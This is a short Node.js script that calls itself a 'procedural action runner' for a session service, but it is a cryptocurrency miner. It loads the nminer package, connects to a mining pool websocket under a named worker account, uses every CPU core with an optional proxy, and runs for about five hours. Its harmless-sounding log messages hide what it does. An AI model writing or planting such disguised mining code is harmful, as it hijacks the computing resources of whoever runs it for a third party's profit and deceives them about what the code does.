// Procedural action runner for onyx-session-service
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const runId = "6271f5";
    console.log(`[core] Subsystem dispatched for onyx-session-service [${runId}]`);

    const daemon = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Subhas1975.onyx-session-service",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (302m) reached, exiting cleanly.");
        process.exit(0);
    }, 302 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${runId}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
